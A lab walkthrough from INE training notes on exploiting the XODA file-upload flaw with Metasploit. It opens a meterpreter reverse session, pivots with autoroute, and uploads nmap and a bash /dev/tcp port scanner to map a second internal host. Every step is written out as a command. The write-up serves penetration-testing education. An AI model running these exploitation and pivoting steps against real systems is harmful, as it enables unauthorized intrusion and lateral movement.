# INE Lab3

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 1419–1540. Examples are lab-specific and need verification.

**Network Service Scanning**

In this lab, we are given access to a Kali machine. There are two target machines, one on the same network i.e. **demo1.ine.local**. This target machine is vulnerable and can be exploited using the following information. Use this information to retrieve services running on the second target machine and complete the mission!

**Vulnerability Information**

**Vulnerability:** XODA File Upload Vulnerability

**Metasploit module:** exploit/unix/webapp/xoda_file_upload

**Objective:** - Identify the ports open on the second target machine using appropriate Metasploit modules. - Write a bash script to scan the ports of the second target machine. - Upload the nmap static binary to the target machine and identify the services running on the second target machine.

**Tools: Metasploit, Bash, Terminal, Nmap**

```bash
ping -c 4 demo1.ine.local
nmap demo1.ine.local
curl demo1.ine.local
msfconsole
```

msf6:

```bash
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
```

**A meterpreter session is spawned on the target machine.**

meterpreter

```bash
shell
ip addr
exit
//meterpreter

run autoroute -s 192.112.218.2       //eth1
```

Background the current meterpreter session and use the portscan tcp module of Metasploit to scan the second target machine.

Press CTRL+z and Enter y to background the meterpreter session.

```bash
use auxiliary/scanner/portscan/tcp

**set RHOSTS 192.112.218.3**

set verbose false
set ports 1-1000
exploit
```

Check the static binaries available in the "/usr/bin/" directory.

root@INE:

```bash
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

Press CTRL+z to background the Metasploit session.

Using the script provided at [https://catonmat.net/tcp-port-scanner-in-bash] as a reference, create a bash script to scan the first 1000 ports

```bash
#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

Save the script as bash-port-scanner.sh

Foreground the Metasploit session and switch to the meterpreter session.

Press "fg" and press enter to foreground the Metasploit session.

```bash
sessions -i 1
```

meterpreter

```bash
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash_port_scanner.sh /tmp/bash_port_scanner.sh
```

Make the binary and script executable and use the bash script to scan the second target machine.

```bash
shell
cd /tmp/
chmod +x ./nmap ./bash_port_scanner.sh
./bash_port_scanner.sh **192.112.218.3**
```

Three ports are open on the target machine, ports 21, 22 and 80.

The services running on the target machine are FTP, SSH and HTTP.

```bash
./nmap -p- **192.112.218.3

//result
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http**

```
